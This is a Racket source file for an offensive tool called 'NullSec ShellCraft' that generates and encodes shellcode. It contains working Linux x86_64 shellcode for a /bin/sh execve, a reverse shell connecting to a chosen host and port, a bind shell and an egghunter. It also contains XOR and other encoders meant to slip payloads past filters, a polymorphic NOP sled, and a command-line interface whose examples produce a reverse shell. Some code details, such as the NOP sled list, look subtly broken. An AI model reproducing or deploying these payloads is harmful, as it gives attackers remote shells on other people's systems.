#lang racket

;; NullSec ShellCraft - Shellcode Generation and Analysis DSL
;; Language: Racket
;; Author: bad-antics
;; License: NullSec Proprietary

(require racket/cmdline
         racket/format
         racket/string
         racket/bytes
         racket/list
         racket/port)

(define VERSION "1.0.0")

(define BANNER #<<END
    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █░░░░░░░░░░░░░░ S H E L L C R A F T ░░░░░░░░░░░░░░░░░░░░░░█
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                       bad-antics v
END
)

;; ============================================================
;; Shellcode Templates
;; ============================================================

;; Linux x86_64 execve("/bin/sh", NULL, NULL)
(define shellcode-linux-x64-execve
  (bytes #x48 #x31 #xf6       ; xor rsi, rsi
         #x56                 ; push rsi
         #x48 #xbf #x2f #x62  ; movabs rdi, "/bin//sh"
         #x69 #x6e #x2f #x2f
         #x73 #x68
         #x57                 ; push rdi
         #x54                 ; push rsp
         #x5f                 ; pop rdi
         #x48 #x31 #xd2       ; xor rdx, rdx
         #xb0 #x3b            ; mov al, 59
         #x0f #x05))          ; syscall

;; Linux x86_64 reverse shell template
(define (shellcode-linux-x64-reverse ip port)
  (let* ([ip-bytes (ip-string->bytes ip)]
         [port-bytes (integer->bytes port 2 #f)])
    (bytes-append
     (bytes #x48 #x31 #xc0       ; xor rax, rax
            #x48 #x31 #xff       ; xor rdi, rdi
            #x48 #x31 #xf6       ; xor rsi, rsi
            #x48 #x31 #xd2       ; xor rdx, rdx
            #xb0 #x29            ; mov al, 41 (socket)
            #x40 #xb7 #x02       ; mov dil, 2 (AF_INET)
            #x40 #xb6 #x01       ; mov sil, 1 (SOCK_STREAM)
            #x0f #x05            ; syscall
            #x48 #x89 #xc7       ; mov rdi, rax
            ; sockaddr_in structure
            #x48 #x31 #xc0       ; xor rax, rax
            #x50                 ; push rax
            #x68)                ; push dword (IP)
     ip-bytes
     (bytes #x66 #x68)           ; push word (port)
     port-bytes
     (bytes #x66 #x6a #x02       ; push 2 (AF_INET)
            #x48 #x89 #xe6       ; mov rsi, rsp
            #xb2 #x10            ; mov dl, 16
            #xb0 #x2a            ; mov al, 42 (connect)
            #x0f #x05            ; syscall
            ; dup2 loop
            #x48 #x31 #xf6       ; xor rsi, rsi
            #xb0 #x21            ; mov al, 33 (dup2)
            #x0f #x05            ; syscall
            #x48 #xff #xc6       ; inc rsi
            #x48 #x83 #xfe #x03  ; cmp rsi, 3
            #x75 #xf4            ; jne dup2_loop
            ; execve
            #x48 #x31 #xf6       ; xor rsi, rsi
            #x56                 ; push rsi
            #x48 #xbf #x2f #x62
            #x69 #x6e #x2f #x2f
            #x73 #x68
            #x57
            #x54
            #x5f
            #x48 #x31 #xd2
            #xb0 #x3b
            #x0f #x05))))

;; Linux x86_64 bind shell template
(define (shellcode-linux-x64-bind port)
  (let ([port-bytes (integer->bytes port 2 #f)])
    (bytes-append
     (bytes #x48 #x31 #xc0       ; xor rax, rax
            ; socket(AF_INET, SOCK_STREAM, 0)
            #xb0 #x29            ; mov al, 41
            #x48 #x31 #xff
            #x40 #xb7 #x02
            #x48 #x31 #xf6
            #x40 #xb6 #x01
            #x48 #x31 #xd2
            #x0f #x05
            #x48 #x89 #xc7       ; mov rdi, rax (save socket fd)
            ; bind
            #x48 #x31 #xc0
            #x50                 ; push 0 (INADDR_ANY)
            #x66 #x68)
     port-bytes
     (bytes #x66 #x6a #x02
            #x48 #x89 #xe6       ; mov rsi, rsp
            #xb2 #x10            ; mov dl, 16
            #xb0 #x31            ; mov al, 49 (bind)
            #x0f #x05
            ; listen
            #x48 #x31 #xf6
            #xb0 #x32            ; mov al, 50 (listen)
            #x0f #x05
            ; accept
            #x48 #x31 #xf6
            #x48 #x31 #xd2
            #xb0 #x2b            ; mov al, 43 (accept)
            #x0f #x05
            #x48 #x89 #xc7       ; mov rdi, rax (client fd)
            ; dup2 + execve (same as reverse)
            #x48 #x31 #xf6
            #xb0 #x21
            #x0f #x05
            #x48 #xff #xc6
            #x48 #x83 #xfe #x03
            #x75 #xf4
            #x48 #x31 #xf6
            #x56
            #x48 #xbf #x2f #x62
            #x69 #x6e #x2f #x2f
            #x73 #x68
            #x57 #x54 #x5f
            #x48 #x31 #xd2
            #xb0 #x3b
            #x0f #x05))))

;; Egghunter (searches for egg marker)
(define (shellcode-egghunter egg)
  (let ([egg-bytes (string->bytes/utf-8 egg)])
    (bytes-append
     (bytes #xfc                 ; cld
            #x31 #xc9            ; xor ecx, ecx
            #xf7 #xe1            ; mul ecx
            #x66 #x81 #xca       ; or dx, 0xfff
            #xff #x0f
            #x42                 ; inc edx
            #x8d #x5a #x04       ; lea ebx, [edx+4]
            #x6a #x21            ; push 33 (access syscall)
            #x58                 ; pop eax
            #xcd #x80            ; int 0x80
            #x3c #xf2            ; cmp al, 0xf2 (EFAULT)
            #x74 #xee            ; je next_page
            #xb8)                ; mov eax, egg
     egg-bytes
     (bytes #x89 #xd7            ; mov edi, edx
            #xaf                 ; scasd
            #x75 #xe9            ; jne next_addr
            #xaf                 ; scasd
            #x75 #xe6            ; jne next_addr
            #xff #xe7))))        ; jmp edi

;; ============================================================
;; Encoders
;; ============================================================

;; XOR encoder
(define (xor-encode shellcode key)
  (define decoder-stub
    (bytes #xeb #x0d            ; jmp short call_decoder
           #x5e                 ; pop rsi
           #x31 #xc9            ; xor ecx, ecx
           #xb1                 ; mov cl, length
           (bytes-length shellcode)
           #x80 #x36 key        ; xor byte [rsi], key
           #x46                 ; inc rsi
           #xe2 #xfa            ; loop decode
           #xeb #x05            ; jmp shellcode
           #xe8 #xee #xff #xff  ; call pop_addr
           #xff))
  (bytes-append decoder-stub
                (bytes-map (λ (b) (bitwise-xor b key)) shellcode)))

;; SUB encoder (subtract from each byte)
(define (sub-encode shellcode key)
  (bytes-map (λ (b) (modulo (- b key) 256)) shellcode))

;; ADD encoder  
(define (add-encode shellcode key)
  (bytes-map (λ (b) (modulo (+ b key) 256)) shellcode))

;; Polymorphic NOP sled generator
(define (generate-nop-sled length)
  (define nop-equivalents
    '(#x90         ; nop
      #x40         ; inc eax / dec eax pair
      #x48         ; dec eax
      #x41         ; inc ecx
      #x49         ; dec ecx
      #x87 #xdb    ; xchg ebx, ebx
      #x87 #xc9))  ; xchg ecx, ecx
  (list->bytes
   (for/list ([_ (in-range length)])
     (list-ref nop-equivalents (random (length nop-equivalents))))))

;; ============================================================
;; Analysis Functions
;; ============================================================

;; Find bad characters
(define (find-bad-chars shellcode bad-chars)
  (define bad-positions '())
  (for ([i (in-range (bytes-length shellcode))]
        [b (in-bytes shellcode)])
    (when (member b bad-chars)
      (set! bad-positions (cons (cons i b) bad-positions))))
  (reverse bad-positions))

;; Parse bad chars from string like "\\x00\\x0a"
(define (parse-bad-chars str)
  (define chars '())
  (define pattern #rx"\\\\x([0-9a-fA-F]{2})")
  (for ([match (regexp-match* pattern str #:match-select values)])
    (set! chars (cons (string->number (cadr match) 16) chars)))
  chars)

;; Calculate shellcode entropy
(define (calculate-entropy shellcode)
  (define freq (make-hash))
  (for ([b (in-bytes shellcode)])
    (hash-update! freq b add1 0))
  (define len (bytes-length shellcode))
  (- (for/sum ([(k v) (in-hash freq)])
       (let ([p (/ v len)])
         (* p (/ (log p) (log 2)))))))

;; Disassemble (simplified - would need real disassembler)
(define (disassemble-shellcode shellcode)
  (printf "Shellcode length: ~a bytes~n" (bytes-length shellcode))
  (printf "Hex dump:~n")
  (for ([i (in-range 0 (bytes-length shellcode) 16)])
    (printf "  ~a: " (~a #:width 4 #:align 'right #:pad-string "0" (number->string i 16)))
    (for ([j (in-range 16)])
      (when (< (+ i j) (bytes-length shellcode))
        (printf "~a " (~a #:width 2 #:pad-string "0" 
                          (number->string (bytes-ref shellcode (+ i j)) 16)))))
    (newline)))

;; ============================================================
;; Utility Functions
;; ============================================================

(define (ip-string->bytes ip)
  (list->bytes
   (map string->number (string-split ip "."))))

(define (integer->bytes n size big-endian?)
  (define bs (make-bytes size))
  (for ([i (in-range size)])
    (bytes-set! bs 
                (if big-endian? i (- size 1 i))
                (bitwise-and (arithmetic-shift n (* -8 i)) #xff)))
  bs)

(define (bytes->c-array shellcode [name "shellcode"])
  (printf "unsigned char ~a[] = {~n" name)
  (for ([i (in-range 0 (bytes-length shellcode) 12)])
    (printf "    ")
    (for ([j (in-range 12)])
      (when (< (+ i j) (bytes-length shellcode))
        (printf "0x~a" (~a #:width 2 #:pad-string "0"
                           (number->string (bytes-ref shellcode (+ i j)) 16)))
        (when (< (+ i j 1) (bytes-length shellcode))
          (printf ", "))))
    (newline))
  (printf "};~n")
  (printf "// Length: ~a bytes~n" (bytes-length shellcode)))

(define (bytes->python shellcode [name "shellcode"])
  (printf "~a = b\"\"~n" name)
  (for ([i (in-range 0 (bytes-length shellcode) 16)])
    (printf "~a += b\"" name)
    (for ([j (in-range 16)])
      (when (< (+ i j) (bytes-length shellcode))
        (printf "\\x~a" (~a #:width 2 #:pad-string "0"
                            (number->string (bytes-ref shellcode (+ i j)) 16)))))
    (printf "\"~n"))
  (printf "# Length: ~a bytes~n" (bytes-length shellcode)))

;; ============================================================
;; Command Line Interface
;; ============================================================

(define (print-usage)
  (displayln "
USAGE:
    shellcraft <command> [options]

COMMANDS:
    generate    Generate shellcode from template
    encode      Encode shellcode
    analyze     Analyze shellcode for issues
    reverse     Generate reverse shell
    bind        Generate bind shell
    egghunter   Generate egghunter

OPTIONS:
    --type        Shellcode type (execve, reverse, bind)
    --arch        Architecture (x86, x64)
    --input       Input shellcode file
    --output      Output file
    --method      Encoding method (xor, sub, add)
    --key         Encoding key
    --host        Host for reverse shell
    --port        Port for shell
    --badchars    Bad characters to avoid
    --format      Output format (raw, c, python)

EXAMPLES:
    shellcraft generate --type execve --arch x64
    shellcraft encode --input shell.bin --method xor --key 0x41
    shellcraft reverse --host 192.168.1.100 --port 4444
    shellcraft analyze --input shell.bin --badchars \"\\x00\\x0a\\x0d\"
"))

(define (main)
  (displayln BANNER)
  (displayln VERSION)
  (newline)
  
  (define cmd (make-parameter ""))
  (define shell-type (make-parameter "execve"))
  (define arch (make-parameter "x64"))
  (define input-file (make-parameter #f))
  (define output-file (make-parameter #f))
  (define encode-method (make-parameter "xor"))
  (define encode-key (make-parameter #x41))
  (define host (make-parameter "127.0.0.1"))
  (define port (make-parameter 4444))
  (define bad-chars (make-parameter ""))
  (define output-format (make-parameter "python"))
  
  (command-line
   #:program "shellcraft"
   #:once-any
   ["generate" "Generate shellcode" (cmd "generate")]
   ["encode" "Encode shellcode" (cmd "encode")]
   ["analyze" "Analyze shellcode" (cmd "analyze")]
   ["reverse" "Generate reverse shell" (cmd "reverse")]
   ["bind" "Generate bind shell" (cmd "bind")]
   ["egghunter" "Generate egghunter" (cmd "egghunter")]
   #:once-each
   ["--type" t "Shellcode type" (shell-type t)]
   ["--arch" a "Architecture" (arch a)]
   ["--input" i "Input file" (input-file i)]
   ["--output" o "Output file" (output-file o)]
   ["--method" m "Encode method" (encode-method m)]
   ["--key" k "Encode key" (encode-key (string->number k))]
   ["--host" h "Reverse shell host" (host h)]
   ["--port" p "Shell port" (port (string->number p))]
   ["--badchars" b "Bad characters" (bad-chars b)]
   ["--format" f "Output format" (output-format f)])
  
  (case (cmd)
    [("generate")
     (displayln "[*] Generating shellcode...")
     (define sc
       (case (shell-type)
         [("execve") shellcode-linux-x64-execve]
         [else shellcode-linux-x64-execve]))
     (displayln "[+] Shellcode generated:")
     (case (output-format)
       [("c") (bytes->c-array sc)]
       [("python") (bytes->python sc)]
       [else (disassemble-shellcode sc)])]
    
    [("encode")
     (if (input-file)
         (let* ([sc (file->bytes (input-file))]
                [encoded (case (encode-method)
                           [("xor") (xor-encode sc (encode-key))]
                           [("sub") (sub-encode sc (encode-key))]
                           [("add") (add-encode sc (encode-key))]
                           [else (xor-encode sc (encode-key))])])
           (displayln "[+] Encoded shellcode:")
           (bytes->python encoded "encoded"))
         (displayln "[!] Please specify input file with --input"))]
    
    [("analyze")
     (if (input-file)
         (let ([sc (file->bytes (input-file))])
           (displayln "[*] Analyzing shellcode...")
           (printf "[*] Size: ~a bytes~n" (bytes-length sc))
           (printf "[*] Entropy: ~a~n" (calculate-entropy sc))
           (when (non-empty-string? (bad-chars))
             (let ([bad (find-bad-chars sc (parse-bad-chars (bad-chars)))])
               (if (empty? bad)
                   (displayln "[+] No bad characters found!")
                   (for ([pos bad])
                     (printf "[!] Bad char 0x~a at offset ~a~n" 
                             (number->string (cdr pos) 16)
                             (car pos)))))))
         (displayln "[!] Please specify input file with --input"))]
    
    [("reverse")
     (displayln (format "[*] Generating reverse shell to ~a:~a" (host) (port)))
     (define sc (shellcode-linux-x64-reverse (host) (port)))
     (bytes->python sc "reverse_shell")]
    
    [("bind")
     (displayln (format "[*] Generating bind shell on port ~a" (port)))
     (define sc (shellcode-linux-x64-bind (port)))
     (bytes->python sc "bind_shell")]
    
    [("egghunter")
     (displayln "[*] Generating egghunter...")
     (define sc (shellcode-egghunter "w00t"))
     (bytes->python sc "egghunter")]
    
    [else (print-usage)]))

(module+ main
  (main))
